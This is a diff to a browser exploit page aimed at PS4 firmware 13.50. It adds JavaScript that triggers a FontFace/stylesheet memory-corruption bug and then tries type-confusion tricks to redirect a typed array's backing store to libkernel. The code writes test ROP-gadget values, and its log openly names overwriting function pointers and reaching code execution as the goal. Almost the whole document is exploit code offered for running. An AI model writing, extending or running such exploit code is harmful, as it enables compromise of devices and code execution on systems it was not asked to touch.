@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 13.50 - Dereference libkernel</title>
+<title>PS4 13.50 - Redirect to libkernel</title>
 <style>
     * {
         margin: 0;
@@ -130,11 +130,11 @@
 
 <div class="container">
     <div class="header">
-        <h1>◈ DEREFERENCE ATTEMPT ◈</h1>
-        <div class="subtitle">Store libkernel addr → Read as object</div>
+        <h1>◈ REDIRECT TO LIBKERNEL ◈</h1>
+        <div class="subtitle">Point our array → libkernel for arbitrary write</div>
     </div>
     
-    <button class="btn" onclick="runExploit()">► DEREFERENCE</button>
+    <button class="btn" onclick="runExploit()">► REDIRECT</button>
     
     <div class="log-container">
         <div class="log-header">◈ EXPLOIT LOG ◈</div>
@@ -157,7 +157,7 @@ function log(msg) {
             else if (line.includes('[ERROR]')) className = 'error';
             else if (line.includes('[!]')) className = 'warning';
             else if (line.includes('[+]')) className = 'info';
-            else if (line.includes('0x7F8B') || line.includes('0x464C45')) className = 'highlight';
+            else if (line.includes('0x7F8B')) className = 'highlight';
             
             return `<span class="${className}">${line}</span>`;
         }).join('\n');
@@ -202,11 +202,12 @@ function runExploit() {
     logBuf = [];
     
     log('═══════════════════════════════════════════════════════');
-    log('    PS4 13.50 - DEREFERENCE LIBKERNEL ADDRESS           ');
+    log('  PS4 13.50 - REDIRECT ARRAY BACKING STORE TO LIBKERNEL');
     log('═══════════════════════════════════════════════════════\n');
     
     log('[TARGET] libkernel: ' + LIBKERNEL_BASE.toString());
-    log('[STRATEGY] Store as float → Read as object → Dereference\n');
+    log('[GOAL] Redirect our array → libkernel backing store');
+    log('[GOAL] Write to our array = write to libkernel!\n');
     
     // Setup
     let style = document.createElement('style');
@@ -214,6 +215,18 @@ function runExploit() {
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
+    // Create OUR controlled array that we want to redirect
+    let controlledArray = new Float64Array(0x100);
+    
+    // Fill with marker
+    for (let i = 0; i < controlledArray.length; i++) {
+        controlledArray[i] = 13.37 + i;
+    }
+    
+    log('[SETUP] Created controlledArray (Float64Array[256])');
+    log('[SETUP] Filled with markers (13.37 + i)\n');
+    
+    // Create confusion arrays
     let floatArray = new Float64Array(100);
     let objectArray = new Array(100);
     
@@ -222,7 +235,7 @@ function runExploit() {
         objectArray[i] = { id: i };
     }
     
-    log('[SETUP] Arrays created\n');
+    log('[SETUP] Created confusion arrays\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -238,6 +251,12 @@ function runExploit() {
                 
                 log('[PHASE 1] ▼▼▼ INSIDE GETTER ▼▼▼\n');
                 
+                // Sample BEFORE corruption
+                log('[BEFORE] controlledArray sample:');
+                log('  [0] = ' + controlledArray[0]);
+                log('  [1] = ' + controlledArray[1]);
+                log('  [10] = ' + controlledArray[10] + '\n');
+                
                 let corrupted = [];
                 for (let i = 0; i < 50; i++) {
                     corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
@@ -248,7 +267,7 @@ function runExploit() {
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
                 
-                log('[CORRUPTION] ✓ Active\n');
+                log('[CORRUPTION] ✓ Triggered\n');
                 
                 // Required setup
                 log('[SETUP] Tests 1-3...');
@@ -262,159 +281,152 @@ function runExploit() {
                 }
                 
                 // ═══════════════════════════════════════════
-                // STORE LIBKERNEL ADDRESS AS FLOAT
+                // ATTEMPT REDIRECTION
                 // ═══════════════════════════════════════════
                 
-                log('[PHASE 2] ▼▼▼ STORE libkernel ADDRESS ▼▼▼\n');
+                log('[PHASE 2] ▼▼▼ REDIRECTION ATTEMPTS ▼▼▼\n');
                 
-                log('[*] Storing libkernel address as float...');
-                floatArray[60] = LIBKERNEL_BASE.asDouble();
+                // TECHNIQUE 1: Store controlledArray in objectArray,
+                //              write libkernel address to floatArray
+                log('[TECHNIQUE 1] Array + Address in confusion\n');
                 
-                log('[*] floatArray[60] = ' + LIBKERNEL_BASE.toString());
-                log('[*] As double: ' + LIBKERNEL_BASE.asDouble() + '\n');
+                log('[*] Storing controlledArray in objectArray[70]');
+                objectArray[70] = controlledArray;
+                
+                log('[*] Writing libkernel LOW WORD to floatArray[70]');
+                floatArray[70] = LIBKERNEL_BASE.low;
+                
+                log('[*] Writing libkernel HIGH WORD to floatArray[71]');
+                floatArray[71] = LIBKERNEL_BASE.high;
+                
+                log('[*] Checking if controlledArray changed...\n');
+                
+                try {
+                    log('[AFTER T1] controlledArray sample:');
+                    log('  [0] = ' + controlledArray[0]);
+                    log('  [1] = ' + controlledArray[1]);
+                    log('  [10] = ' + controlledArray[10]);
+                    
+                    let changed1 = Math.abs(controlledArray[0] - 13.37) > 0.01;
+                    log('  Changed: ' + changed1 + '\n');
+                    
+                    if (changed1) {
+                        log('[+++] CONTROLLED ARRAY CHANGED!');
+                        log('[+++] Might be redirected!\n');
+                    }
+                    
+                } catch(e) {
+                    log('[!] ERROR reading: ' + e.message);
+                    log('[+] Error might mean redirection worked!\n');
+                }
+                
+                // TECHNIQUE 2: Store as entire Int64
+                log('[TECHNIQUE 2] Store libkernel as single float\n');
+                
+                objectArray[75] = controlledArray;
+                floatArray[75] = LIBKERNEL_BASE.asDouble();
+                
+                log('[*] Stored libkernel address as float');
+                log('[*] Checking controlledArray...\n');
+                
+                try {
+                    log('[AFTER T2] controlledArray:');
+                    log('  [0] = ' + controlledArray[0]);
+                    
+                    let changed2 = Math.abs(controlledArray[0] - 13.37) > 0.01;
+                    log('  Changed: ' + changed2 + '\n');
+                    
+                } catch(e) {
+                    log('[!] ERROR: ' + e.message + '\n');
+                }
+                
+                // TECHNIQUE 3: Store at ADJACENT indices
+                log('[TECHNIQUE 3] Adjacent index pattern\n');
+                
+                objectArray[79] = controlledArray;
+                objectArray[80] = { libkernel: LIBKERNEL_BASE.asDouble() };
+                floatArray[80] = LIBKERNEL_BASE.asDouble();
+                
+                log('[*] Array at [79], address at [80]');
+                log('[*] Checking...\n');
+                
+                try {
+                    log('[AFTER T3] controlledArray:');
+                    log('  [0] = ' + controlledArray[0]);
+                    
+                    let changed3 = Math.abs(controlledArray[0] - 13.37) > 0.01;
+                    log('  Changed: ' + changed3 + '\n');
+                    
+                } catch(e) {
+                    log('[!] ERROR: ' + e.message + '\n');
+                }
                 
                 // ═══════════════════════════════════════════
-                // READ AS OBJECT
+                // TEST WRITE IF CHANGED
                 // ═══════════════════════════════════════════
                 
-                log('[PHASE 3] ▼▼▼ READ AS OBJECT ▼▼▼\n');
+                log('[PHASE 3] ▼▼▼ TEST WRITE ▼▼▼\n');
                 
-                log('[*] Reading objectArray[60]...');
-                let derefObj = objectArray[60];
+                log('[*] Attempting to write test values...');
+                log('[*] If redirected, this writes to libkernel!\n');
                 
-                log('[*] Type: ' + typeof derefObj);
-                log('[*] Value: ' + derefObj + '\n');
-                
-                if (typeof derefObj === 'object' && derefObj !== null) {
-                    log('[+] Got object!\n');
+                try {
+                    // Try writing test ROP gadget addresses
+                    let testValues = [
+                        0x4141414141414141,
+                        0x4242424242424242,
+                        0x4343434343434343
+                    ];
                     
-                    // ═══════════════════════════════════════════
-                    // PROPERTY ACCESS ATTEMPTS
-                    // ═══════════════════════════════════════════
-                    
-                    log('[PHASE 4] ▼▼▼ DEREFERENCING ATTEMPTS ▼▼▼\n');
-                    
-                    // Try 1: Direct property access
-                    log('[TRY 1] Direct property access');
-                    try {
-                        log('  derefObj.id = ' + derefObj.id);
-                        log('  derefObj.marker = ' + hex(derefObj.marker));
-                        log('  derefObj[0] = ' + derefObj[0]);
-                        log('  derefObj.length = ' + derefObj.length);
-                    } catch(e) {
-                        log('  [!] Error: ' + e.message);
+                    log('[WRITE TEST] Writing 3 test values:');
+                    for (let i = 0; i < testValues.length; i++) {
+                        let val = new Int64(
+                            testValues[i] & 0xFFFFFFFF,
+                            (testValues[i] / 0x100000000) & 0xFFFFFFFF
+                        );
+                        
+                        controlledArray[i] = val.asDouble();
+                        log('  [' + i + '] = ' + val.toString());
                     }
-                    log('');
                     
-                    // Try 2: Enumerate properties
-                    log('[TRY 2] Enumerate properties');
-                    try {
-                        let count = 0;
-                        for (let key in derefObj) {
-                            log('  ' + key + ': ' + derefObj[key]);
-                            count++;
-                            if (count > 10) {
-                                log('  ...(truncated)');
-                                break;
-                            }
-                        }
-                        if (count === 0) log('  (no enumerable properties)');
-                    } catch(e) {
-                        log('  [!] Error: ' + e.message);
+                    log('\n[+] Write completed without error!');
+                    log('[*] Reading back...\n');
+                    
+                    log('[READ BACK]');
+                    for (let i = 0; i < testValues.length; i++) {
+                        let readBack = controlledArray[i];
+                        let addr = Int64.fromDouble(readBack);
+                        log('  [' + i + '] = ' + addr.toString());
                     }
-                    log('');
                     
-                    // Try 3: Array-like access
-                    log('[TRY 3] Array-like access');
-                    try {
-                        log('  Trying derefObj[0] through [15]...');
-                        for (let i = 0; i < 16; i++) {
-                            let val = derefObj[i];
-                            if (val !== undefined) {
-                                if (typeof val === 'number') {
-                                    let addr = Int64.fromDouble(val);
-                                    log('  [' + i + '] = ' + addr.toString());
-                                } else {
-                                    log('  [' + i + '] = ' + val + ' (type: ' + typeof val + ')');
-                                }
-                            }
-                        }
-                    } catch(e) {
-                        log('  [!] Error at access: ' + e.message);
-                    }
-                    log('');
-                    
-                    // Try 4: TypedArray methods
-                    log('[TRY 4] TypedArray-style access');
-                    try {
-                        if (derefObj.buffer) {
-                            log('  Has .buffer property!');
-                            log('  buffer: ' + derefObj.buffer);
-                        }
-                        if (derefObj.byteLength) {
-                            log('  byteLength: ' + derefObj.byteLength);
-                        }
-                        if (typeof derefObj.subarray === 'function') {
-                            log('  Has .subarray() method!');
-                            let sub = derefObj.subarray(0, 4);
-                            log('  subarray: ' + sub);
-                        }
-                    } catch(e) {
-                        log('  [!] Error: ' + e.message);
-                    }
-                    log('');
-                    
-                    // Try 5: Cast to Uint8Array
-                    log('[TRY 5] Force cast to Uint8Array');
-                    try {
-                        let u8 = new Uint8Array(derefObj);
-                        log('  Created Uint8Array from object');
-                        log('  Length: ' + u8.length);
-                        if (u8.length > 0) {
-                            log('  First 16 bytes:');
-                            let hex_str = '  ';
-                            for (let i = 0; i < Math.min(16, u8.length); i++) {
-                                hex_str += u8[i].toString(16).padStart(2, '0') + ' ';
-                            }
-                            log(hex_str);
-                        }
-                    } catch(e) {
-                        log('  [!] Error: ' + e.message);
-                    }
-                    log('');
-                    
-                    // Try 6: toString, valueOf
-                    log('[TRY 6] toString/valueOf');
-                    try {
-                        log('  toString(): ' + derefObj.toString());
-                        log('  valueOf(): ' + derefObj.valueOf());
-                    } catch(e) {
-                        log('  [!] Error: ' + e.message);
-                    }
-                    log('');
-                    
-                } else {
-                    log('[-] Did not get object back');
-                    log('[-] Type was: ' + typeof derefObj + '\n');
+                } catch(e) {
+                    log('[ERROR] Write/read failed: ' + e.message);
+                    log('[*] This might mean no redirection occurred\n');
                 }
                 
                 // ═══════════════════════════════════════════
                 // ANALYSIS
                 // ═══════════════════════════════════════════
                 
-                log('╔════════════════════════════════════════════════╗');
+                log('\n╔════════════════════════════════════════════════╗');
                 log('║              ANALYSIS                          ║');
                 log('╚════════════════════════════════════════════════╝\n');
                 
-                log('[WHAT WE LEARNED]');
-                log('  If we got an object:');
-                log('    Check which TRY succeeded');
-                log('    Look for any meaningful data');
-                log('    Especially hex values like 0x7F8B or 0x464C45 (ELF header)');
-                log('');
-                log('  If no object or all TRYs failed:');
-                log('    Confusion doesn\'t provide dereference');
-                log('    May need WebAssembly or different approach');
+                log('[RESULTS]');
+                log('  Review "Changed:" values above');
+                log('  Check if any technique showed changed array\n');
+                
+                log('[IF SUCCESSFUL]');
+                log('  controlledArray no longer reads 13.37+i');
+                log('  Writes to controlledArray go to libkernel');
+                log('  Can now write ROP chain!');
+                log('  Can overwrite function pointers!');
+                log('  Can achieve code execution!\n');
+                
+                log('[IF UNSUCCESSFUL]');
+                log('  controlledArray still reads 13.37+i');
+                log('  Redirection didn\'t work');
+                log('  May need different bug or approach');
                 
                 log('\n[!] Returning - OOM will occur');
                 log('═══════════════════════════════════════════════════════\n');
@@ -424,16 +436,16 @@ function runExploit() {
         }
     });
     
-    log('[*] Starting...\n');
+    log('[*] Starting exploit...\n');
     document.fonts.load('1em x', 'AB');
 }
 
 log('═══════════════════════════════════════════════════════');
-log('       DEREFERENCE ATTEMPT READY                        ');
+log('      ARRAY REDIRECTION READY                          ');
 log('═══════════════════════════════════════════════════════\n');
-log('[INFO] Store libkernel address, try to read as object');
-log('[INFO] 6 different dereferencing techniques\n');
-log('[READY] Click DEREFERENCE\n');
+log('[INFO] Attempting to redirect array backing store');
+log('[INFO] Goal: controlledArray writes → libkernel writes\n');
+log('[READY] Click REDIRECT\n');
 
 </script>
 </body>
